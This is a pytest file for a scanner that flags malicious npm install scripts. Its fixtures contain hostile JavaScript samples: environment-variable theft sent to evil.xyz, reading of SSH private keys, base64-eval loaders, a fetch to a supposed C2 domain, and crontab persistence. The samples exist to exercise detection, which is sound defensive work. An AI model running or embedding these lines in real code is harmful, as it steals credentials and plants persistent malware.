"""Tests for static analysis scanner."""

import tempfile
from pathlib import Path

import pytest

from app.core.config import Settings
from app.scanners.static_analysis import StaticAnalysisScanner
from app.schemas.package import PackageInfo


@pytest.fixture
def scanner(settings: Settings) -> StaticAnalysisScanner:
    return StaticAnalysisScanner(settings)


def _make_package(install_scripts: dict[str, str] | None = None) -> PackageInfo:
    return PackageInfo(
        name="test-pkg",
        version="1.0.0",
        install_scripts=install_scripts or {},
    )


def _write_temp_file(content: str) -> Path:
    p = Path(tempfile.mktemp(suffix=".js"))
    p.write_text(content)
    return p


async def test_pass_no_scripts(scanner: StaticAnalysisScanner) -> None:
    result = await scanner.scan(_make_package(), [])
    assert result.verdict == "pass"


async def test_pass_safe_gyp(scanner: StaticAnalysisScanner) -> None:
    result = await scanner.scan(_make_package({"install": "node-gyp rebuild"}), [])
    assert result.verdict == "pass"
    assert "known safe" in result.details.lower()


async def test_pass_safe_husky(scanner: StaticAnalysisScanner) -> None:
    result = await scanner.scan(_make_package({"postinstall": "husky install"}), [])
    assert result.verdict == "pass"


async def test_detect_env_exfil(scanner: StaticAnalysisScanner) -> None:
    scripts = {"postinstall": 'node -e "JSON.stringify(process.env)"'}
    result = await scanner.scan(_make_package(scripts), [])
    assert result.verdict in ("warn", "fail")
    assert result.confidence > 0.5


async def test_detect_ssh_access(scanner: StaticAnalysisScanner) -> None:
    f = _write_temp_file("const keys = fs.readFileSync('~/.ssh/id_rsa');")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
        assert "ssh" in result.details.lower()
    finally:
        f.unlink(missing_ok=True)


async def test_detect_base64_eval(scanner: StaticAnalysisScanner) -> None:
    code = "eval(Buffer.from('Y29uc29sZS5sb2coJ2hlbGxvJyk=', 'base64').toString())"
    f = _write_temp_file(code)
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_detect_known_c2_domain(scanner: StaticAnalysisScanner) -> None:
    scripts = {"postinstall": "node -e \"fetch('https://sfrclak.com/data')\""}
    result = await scanner.scan(_make_package(scripts), [])
    assert result.verdict == "fail"


async def test_detect_data_exfiltration(scanner: StaticAnalysisScanner) -> None:
    code = "https.get('https://evil.xyz/steal?d=' + Buffer.from(JSON.stringify(process.env)).toString('base64'))"
    f = _write_temp_file(code)
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_persistence_crontab(scanner: StaticAnalysisScanner) -> None:
    f = _write_temp_file("exec('crontab -l | echo \"* * * * * /tmp/evil\" | crontab -')")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_clean_code_passes(scanner: StaticAnalysisScanner) -> None:
    code = """
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Hello'));
app.listen(3000);
"""
    f = _write_temp_file(code)
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "pass"
    finally:
        f.unlink(missing_ok=True)


async def test_scanner_name(scanner: StaticAnalysisScanner) -> None:
    result = await scanner.scan(_make_package(), [])
    assert result.scanner_name == "static_analysis"


async def test_multiple_matches_increase_severity(scanner: StaticAnalysisScanner) -> None:
    code = """
const env = JSON.stringify(process.env);
const data = Buffer.from(env).toString('base64');
fetch('https://evil.xyz/steal?d=' + data);
exec('crontab -l');
fs.readFileSync('~/.ssh/id_rsa');
"""
    f = _write_temp_file(code)
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
        assert result.confidence > 0.8
    finally:
        f.unlink(missing_ok=True)
